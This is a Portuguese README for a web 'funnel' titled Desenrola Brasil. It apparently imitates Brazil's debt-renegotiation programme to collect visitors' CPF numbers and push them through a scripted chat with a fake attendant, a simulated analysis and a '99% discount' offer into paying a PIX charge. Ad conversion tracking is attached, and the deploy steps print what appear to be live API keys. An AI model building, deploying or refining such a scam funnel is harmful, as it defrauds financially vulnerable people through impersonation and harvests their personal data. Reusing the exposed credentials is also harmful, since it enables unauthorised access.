# 🎯 Desenrola Brasil - Funnel de Pagamento PIX

Funnel completo de renegociação de dívidas com geração de PIX via Aven Payments.

## 📋 O que foi criado

```
VERIFICADEV/
├── index.html              # PT1 - Formulário de CPF
├── atendimento.html        # PT2 - Chat funnel + PIX
├── api/
│   └── gerar-pix.js       # Serverless Function (Vercel)
├── css/
│   └── desenrola.css
├── js/
│   ├── header.js
│   ├── pixel-google.js
│   ├── tracker.js
│   └── tracking.js
├── assets/                # Imagens, vídeos, áudio
├── images/
├── vercel.json            # Configuração Vercel
├── .env.example           # Template de variáveis
├── .gitignore             # Git ignore
├── package.json           # Node.js config
└── DEPLOY_VERCEL.md       # Instruções de deploy
```

## 🔐 Segurança

- ✅ Chaves de API protegidas em Serverless Functions
- ✅ Variáveis de ambiente seguras
- ✅ CORS configurado
- ✅ Sem credenciais expostas no frontend

## 🚀 Deploy Rápido (3 Passos)

### 1. Git + GitHub
```bash
git init
git add .
git commit -m "Deploy Desenrola Brasil"
git remote add origin https://github.com/seu-usuario/desenrola-brasil.git
git push -u origin main
```

### 2. Vercel
1. Acesse [vercel.com](https://vercel.com)
2. Clique "Import Project"
3. Selecione seu repositório GitHub
4. Clique "Import"

### 3. Variáveis de Ambiente
Na Vercel → Settings → Environment Variables:

```
AVEN_API_KEY = 2zxA50CzfpTMZgKCwuotYv681fsfo4bcrXrdttHxdD4
CPF_API_TOKEN = 76418167-38e2-46aa-acf1-51ed15b4db9f
```

## 📊 Fluxo do Funnel

```
1. index.html (PT1)
   ├─ Usuário insere CPF
   ├─ API valida CPF
   └─ Redireciona para PT2

2. atendimento.html (PT2)
   ├─ Chat com Letícia (atendente)
   ├─ Simulação de análise
   ├─ Oferta de acordo (99% desconto)
   ├─ Usuário clica: "REALIZAR PAGAMENTO"
   ├─ Sistema gera PIX automaticamente (/api/gerar-pix)
   ├─ Exibe QR Code + Copypasta
   └─ Funil termina após confirmação

3. Webhook (Aven Payments)
   ├─ PIX pago? → Atualiza status
   └─ Integração com seu backend
```

## 🔗 Endpoints

| Método | URL | Descrição |
|--------|-----|-----------|
| GET | `/` | Página inicial (PT1) |
| GET | `/atendimento.html` | Chat funnel (PT2) |
| POST | `/api/gerar-pix` | Gera PIX (Serverless) |

### Exemplo de Requisição POST /api/gerar-pix

```json
{
  "nome": "João Silva Santos",
  "cpf": "12345678901",
  "codigoAcordo": "ABC123-XYZ"
}
```

### Resposta

```json
{
  "id": "pay_xxxxx",
  "status": "PENDING",
  "amount": 6892,
  "copypaste": "00020101...",
  "e2e": "E123456..."
}
```

## 📱 URLs de Teste

Após deploy na Vercel:

- **Site**: `https://seu-projeto.vercel.app`
- **Funnel**: `https://seu-projeto.vercel.app/atendimento.html?name=Teste&document=12345678901&nasc=1990-01-15`

## ✨ Integrações

- ✅ **Aven Payments** - Gateway de PIX
- ✅ **CPF API** - Validação de CPF
- ✅ **Google Ads** - Pixel de conversão
- ✅ **QR Server** - Geração de QR Codes
- ✅ **Vercel** - Hosting + Serverless

## 📝 Configuração de Produção

### Google Ads Conversion
No código já está configurado:
- Conversion ID: `AW-641098165`
- Conversion Label: `oQT4CMzGn-McELXD2bEC`

### Webhooks (Aven Payments)
Configure em seu painel:
- URL: `https://seu-dominio.com/webhook/payment`
- Escute eventos: `PAID`, `REFUSED`, `REFUNDED`

## 🐛 Debug

Abra o console (F12) para ver:
- Logs de requisição à API
- Status do PIX
- Erros de validação

## 📞 Suporte

Para mais detalhes, consulte:
- `DEPLOY_VERCEL.md` - Instruções detalhadas de deploy
- Documentação Aven Payments na pasta `docs/`

---

**Pronto para produção! 🚀**
